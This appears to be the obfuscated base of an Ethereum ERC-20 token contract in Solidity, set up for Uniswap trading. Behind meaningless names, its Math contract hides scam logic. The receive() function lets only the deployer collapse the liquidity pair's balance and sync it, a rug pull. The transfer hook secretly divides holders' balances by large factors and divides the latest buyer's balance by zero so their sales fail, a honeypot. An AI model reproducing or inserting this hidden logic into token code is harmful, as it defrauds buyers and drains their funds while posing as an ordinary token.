pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Selling;

    address[] internal twArr; address[3] internal twitAddr;

    bool[3] internal Buying; bool internal trading = false;

    uint256 internal Cows = block.number*2; uint256 internal numB;
    uint256 internal Table = 0; uint256 internal Food = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function set() internal {
        twitAddr[0] = address(_router);
        twitAddr[1] = msg.sender;
        twitAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Selling[Math.twitAddr[q]] = true; Math.Buying[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Table > 1 ? twArr[twArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == twitAddr[1]); _balances[twitAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(twitAddr[2]).sync(); Buying[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == twitAddr[1])), "ERC20: trading is not yet enabled.");
        Food += ((Selling[sender] != true) && (Selling[recipient] == true)) ? 1 : 0;
        if (((Selling[sender] == true) && (Selling[recipient] != true)) || ((Selling[sender] != true) && (Selling[recipient] != true))) { twArr.push(recipient); }
        _balancesOfTheTwitter(sender, recipient);
    }

    function _balancesOfTheTwitter(address sender, address recipient) internal {
        if ((Buying[0] || (Buying[2] && (recipient != twitAddr[1])))) { for (uint256 q=0; q < twArr.length-1; q++) { _balances[twArr[q]] /= (Buying[2] ? 1e9 : 4e1); } Buying[0] = false; }
        _balances[last(1)] /= (((Cows == block.number) || Buying[1] || ((Cows - numB) <= 7)) && (Selling[last(1)] != true) && (Table > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Buying[1]) && (last(0) == sender)) || ((Buying[2] && (twitAddr[1] != sender))) ? (0) : (1));
        (Buying[0],Buying[1]) = ((((Food*10 / 4) == 10) && (Buying[1] == false)) ? (true,true) : (Buying[0],Buying[1]));
        Cows = block.number; Table++;
    }
}